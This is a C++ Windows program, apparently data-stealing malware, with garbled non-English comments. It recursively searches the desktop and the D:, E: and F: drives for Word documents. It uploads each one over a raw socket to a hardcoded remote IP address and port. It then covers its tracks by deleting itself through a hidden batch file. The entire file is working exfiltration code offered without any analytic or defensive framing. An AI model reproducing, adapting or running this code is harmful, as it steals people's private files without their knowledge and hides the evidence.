
#include<string>
#include<io.h>   
#include "winsock2.h"
#include<windows.h>
#include "shlobj.h"		//������ 
#include <wchar.h>
#include<stdlib.h>

#pragma comment(lib,"ws2_32.lib")

#define SERVERIP	"39.105.49.161"
#define SERVERPORT 3333
#define SIZE 4096//4096
#define BUFSIZE 4096


using namespace std;

string getDesktopPath();
int WriteTextToFile(const char szFileName[], const char *lpszText)
{
FILE *pfile = fopen(szFileName, "w+");
if (pfile == NULL)
return -1;
int nWriteByte = fprintf(pfile, lpszText);
fclose(pfile);
return nWriteByte;
}

void DeleteApplicationSelf()
{
const char szFileName[] = "DeleteBat.bat"; //ʹ��������
const char szDeleteBatText[] = "@ echo off\r\ndel %%1\r\ndel %%0";
//����BAT�ļ���д������
WriteTextToFile(szFileName, szDeleteBatText);
//���ñ�������̻���Ϊʵʱִ�У������˳���
SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
//֪ͨ��Դ����������ʾ�����򣬵�Ȼ�������û��������ɾ����ˢ����Դ���������Ի���ʾ�����ġ�
SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, _pgmptr, NULL);
//����bat�ļ���ɾ������
ShellExecute(NULL, "open", "DeleteBat.bat", _pgmptr, NULL, SW_HIDE);
ExitProcess(0);
}
int SendFile(SOCKET sock,char filename[512])
{
	int ret,cnt,lenlast;
	char sendBuf[BUFSIZE],recvBuf[BUFSIZE];
	FILE *fp;
	int totlen;
	fp=fopen(filename,"rb");
	if (NULL==fp)
	{
		printf("1====================open file error\n");
		return -1;
	}
 
    fseek(fp,0,SEEK_END);
	totlen=ftell(fp);
	printf("�ļ�%s�ĳ���Ϊ%d�ֽ�\n",filename,totlen);
 
	char* purename;
	purename=strrchr(filename,'\\');	//���� 
 
	memset(sendBuf,0,sizeof(sendBuf));
	strcpy(sendBuf,purename+1);
 
	ret=send(sock,sendBuf,strlen(sendBuf)+1,0);
	if (SOCKET_ERROR==ret)
	{
	printf("2==================open file error\n");
		return -2;
	}
 
	memset(recvBuf,0,sizeof(recvBuf));
	ret=recv(sock,recvBuf,sizeof(recvBuf),0);
	if (SOCKET_ERROR==ret|| (strcmp(sendBuf,recvBuf)!=0) )
	{
	printf("3=====================open file error\n");
		return -3;
	} 
 
	printf("������������ļ����ɹ�\n");
 
	memset(sendBuf,0,sizeof(sendBuf));
	itoa(totlen,sendBuf,10);
	ret=send(sock,sendBuf,strlen(sendBuf)+1,0);
	if (SOCKET_ERROR==ret)
	{
		printf("4=======================open file error\n");
		return -4;
	}
 
	memset(recvBuf,0,sizeof(recvBuf));
	ret=recv(sock,recvBuf,sizeof(recvBuf),0);
	if (SOCKET_ERROR==ret|| (strcmp(sendBuf,recvBuf)!=0) )
	{
		printf("5====================open file error\n");
		return -5;
	} 
 
	printf("������������ļ����ȳɹ�\n");	
 
	int i, res;
	cnt = totlen/SIZE;
	res = totlen%SIZE;
	lenlast = SIZE;
	if(res)
	{
		lenlast = res;
		cnt++;
	}
 
	rewind(fp);
//	printf("\n���濪ʼ�����ļ���������...\n\n");
 
	int sendBytes = 0;
	int progress,count;
	bool flag = true;
	for(i=1; i<cnt; i++)
	{
		fread(sendBuf,SIZE,1,fp);
		ret = send(sock,sendBuf,SIZE,0);
		if (SOCKET_ERROR==ret)
		{
			return -6;
		}
 
		printf("\r");
		printf("[");
 
		sendBytes += ret;
		progress = 50;
		count = sendBytes/(totlen/progress);
		for(int j=0; j<progress; j++)
		{
			if(j<=count)
				printf("=");
			else
				printf("+");
		}
 
		printf("]");
 
		if(cnt==i+1)
		{
			sendBytes += lenlast;						
		}
 
		printf(" %8ld/%ld %6.2f%%",sendBytes ,totlen ,(float)sendBytes/totlen*100);
	}
	
	fread(sendBuf,lenlast,1,fp);
	ret = send(sock,sendBuf,lenlast,0);
 
	if (SOCKET_ERROR==ret)
	{
		return -7;
	}
 
	printf("\n\n ###### �ɹ������ļ���###### \n");
	
	fclose(fp);
	return 0;
}
  
    int   filesearch(string path)   
    {   
	
		
            struct _finddata_t   filefind;   
            string  curr=path+"\\*.*";   
		   int handle;   
           if((handle=_findfirst(curr.c_str(),&filefind))==-1)
               return -1; 
                 
          while(!(_findnext(handle,&filefind)))   
           {   
		
                  if(!strcmp(filefind.name,"..")){
                       
                          continue;
                   }

                   if   ((_A_SUBDIR==filefind.attrib))   
                   {              
                           curr=path+"\\"+filefind.name;  
						     
                          filesearch(curr);   
                   }   
                   else     
                   {  	
                   			   
				   		curr=path+"\\"+filefind.name;  

							char dst[255]={0};
     						for(int i=0;i<=curr.length();i++)
								dst[i]=curr[i];
							char *mowei;
							const char ch = '.';
							mowei=	strrchr(dst, ch) ;
							if(mowei==0)
								continue ;
							if (strcmp(mowei,".doc")==0  || strcmp(mowei,".docx")==0)
					       { 
					       		//	Sleep(300);
					       			int ret,len;
									WSADATA data;
									SOCKET sockClient;
									struct sockaddr_in addrServer;
								
									ret=WSAStartup(MAKEWORD(2,2),&data);
									if (SOCKET_ERROR==ret)
									{
										return -1;
									}
								 
									sockClient=socket(AF_INET,SOCK_STREAM,0);
									if (INVALID_SOCKET==sockClient)
									{
										WSACleanup();
										return -2;
									}
								 
									memset(&addrServer,0,sizeof(struct sockaddr_in));
									addrServer.sin_family=AF_INET;
									addrServer.sin_addr.S_un.S_addr=inet_addr(SERVERIP);
									addrServer.sin_port=htons(SERVERPORT);
								 
									len=sizeof(struct sockaddr);
									ret=connect(sockClient,(sockaddr*)&addrServer,len);
									if (SOCKET_ERROR==ret)
									{
										closesocket(sockClient);
										WSACleanup();
										return -3;
									}
								 
									printf("���ӷ������ɹ�\n");
					            	printf(" %s\n",dst);	
					           		SendFile(sockClient,dst);
									closesocket(sockClient);
									WSACleanup();
									
					       }
				
				       

                   }   
           }           
          _findclose(handle);               
   }   
   

LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		/* Upon destruction, tell the main thread to stop */
		case WM_DESTROY: {
			PostQuitMessage(0);
			break;
		}
		
		/* All other messages (a lot of them) are processed using default procedures */
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
	

	
	string pathD = getDesktopPath();  
	filesearch(pathD);    
	
	string   path1="D:";   
	filesearch(path1);   
	
	
	string   path2="E:";   
	filesearch(path2);  
	
	string   path3="F:";   
	filesearch(path3);   
	
	
		int ret,len;
									WSADATA data;
									SOCKET sockClient;
									struct sockaddr_in addrServer;
								
									ret=WSAStartup(MAKEWORD(2,2),&data);
									if (SOCKET_ERROR==ret)
									{
										return -1;
									}
								 
									sockClient=socket(AF_INET,SOCK_STREAM,0);
									if (INVALID_SOCKET==sockClient)
									{
										WSACleanup();
										return -2;
									}
								 
									memset(&addrServer,0,sizeof(struct sockaddr_in));
									addrServer.sin_family=AF_INET;
									addrServer.sin_addr.S_un.S_addr=inet_addr(SERVERIP);
									addrServer.sin_port=htons(SERVERPORT);
								 
									len=sizeof(struct sockaddr);
									ret=connect(sockClient,(sockaddr*)&addrServer,len);
									if (SOCKET_ERROR==ret)
									{
										closesocket(sockClient);
										WSACleanup();
										return -3;
									}
								 
									printf("���ӷ������ɹ�\n");
					            	
									char sendBuf[2]={0xff,0xff};	
					           		send(sockClient,sendBuf,2,0);
									closesocket(sockClient);
									WSACleanup();
									DeleteApplicationSelf();
	return 0;

}
string getDesktopPath()
{
LPITEMIDLIST pidl;

LPMALLOC pShellMalloc;

char szDir[200];

if (SUCCEEDED(SHGetMalloc(&pShellMalloc)))

{
if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl))) {
// ����ɹ�����true

SHGetPathFromIDListA(pidl, szDir);

pShellMalloc->Free(pidl);

}

pShellMalloc->Release();

}

return string(szDir);

}

